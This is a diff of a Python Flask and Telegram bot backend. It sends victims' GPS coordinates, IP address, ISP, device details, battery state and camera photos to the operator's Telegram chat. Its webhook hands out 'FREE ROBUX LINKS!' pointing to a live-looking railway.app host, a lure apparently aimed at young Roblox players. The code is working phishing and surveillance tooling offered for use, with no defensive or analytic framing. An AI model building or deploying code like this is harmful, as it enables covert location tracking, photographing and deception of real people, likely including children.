@@ -13,53 +13,41 @@ def send_telegram(data):
     dev = data.get('device',{})
     net = data.get('network',{})
     con = data.get('connection',{})
+    gps = data.get('gps',{})
     
-    msg = f"""🎯 *NEW SESSION*
+    msg = f"""🎯 NEW SESSION
 
-🕐 `{data.get('timestamp')}`
-🆔 `{data.get('sessionId')}`
+🕐 {data.get('timestamp')}
+🆔 {data.get('sessionId')}
 
-📍 *GPS:*
-• Lat: `{data.get('gps',{}).get('lat','?')}`
-• Lon: `{data.get('gps',{}).get('lon','?')}`
-• Accuracy: `{data.get('gps',{}).get('accuracy','?')}`
+📍 GPS: {gps.get('lat','?')}, {gps.get('lon','?')}
+🎯 Accuracy: {gps.get('accuracy','?')}
 
-🌐 *NETWORK:*
-• IP: `{net.get('ip','?')}`
-• City: {net.get('city','?')}
-• Region: {net.get('region','?')}
-• Country: {net.get('country','?')}
-• ISP: {net.get('isp','?')}
+🌐 IP: {net.get('ip','?')}
+🏙 City: {net.get('city','?')}
+🌍 Country: {net.get('country','?')}
+📡 ISP: {net.get('isp','?')}
 
-📱 *DEVICE:*
-• Platform: `{dev.get('platform','?')}`
-• Screen: {dev.get('screen','?')} @ {dev.get('pixelRatio','?')}x
-• Cores: {dev.get('cores','?')} | RAM: {dev.get('memory','?')}GB
-• Language: {dev.get('language','?')}
-• Timezone: {dev.get('timezone','?')}
+📱 Device: {dev.get('platform','?')}
+🖥 Screen: {dev.get('screen','?')}
+🧠 Cores: {dev.get('cores','?')}
+💾 RAM: {dev.get('memory','?')}GB
+🗣 Language: {dev.get('language','?')}
+🕐 Timezone: {dev.get('timezone','?')}
 
-🔋 *BATTERY:*
-• Level: {bat.get('level','?')}
-• Charging: {bat.get('charging','?')}
-
-📶 *CONNECTION:*
-• Type: {con.get('type','?')}
-• Speed: {con.get('downlink','?')}
-• RTT: {con.get('rtt','?')}
-
-🔗 *Page:* {data.get('pageInfo',{}).get('url','?')}
-"""
+🔋 Battery: {bat.get('level','?')} | Charging: {bat.get('charging','?')}
+📶 Connection: {con.get('type','?')} | {con.get('downlink','?')}Mbps"""
 
     try:
         requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage',
-                     json={'chat_id': TELEGRAM_CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
+                     json={'chat_id': TELEGRAM_CHAT_ID, 'text': msg})
     except: pass
 
     if data.get('photo'):
         try:
             b = base64.b64decode(data['photo'].split(',')[1])
             requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto',
-                         data={'chat_id': TELEGRAM_CHAT_ID, 'caption': '📸 CAMERA CAPTURE'},
+                         data={'chat_id': TELEGRAM_CHAT_ID, 'caption': '📸 Camera Capture'},
                          files={'photo': ('photo.jpg', b, 'image/jpeg')})
         except: pass
 
@@ -88,15 +76,15 @@ def webhook():
         chat_id = update['message']['chat']['id']
         text = update['message'].get('text', '')
         if text in ['/start', '/link']:
-            msg = """🎮 *FREE ROBUX LINKS!* 🎮
+            msg = """🎮 FREE ROBUX LINKS!
 
-1️⃣ https://hello-camera-production.up.railway.app/roblox
-2️⃣ https://hello-camera-production.up.railway.app/freerobux
-3️⃣ https://hello-camera-production.up.railway.app/video
+1: https://hello-camera-production.up.railway.app/roblox
+2: https://hello-camera-production.up.railway.app/freerobux
+3: https://hello-camera-production.up.railway.app/video
 
-🎁 *Claim your Robux now!* 🎁"""
+🎁 Claim your Robux now!"""
             requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage',
-                         json={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
+                         json={'chat_id': chat_id, 'text': msg})
     return jsonify({'status':'ok'})
 
 @app.route('/setup_webhook')
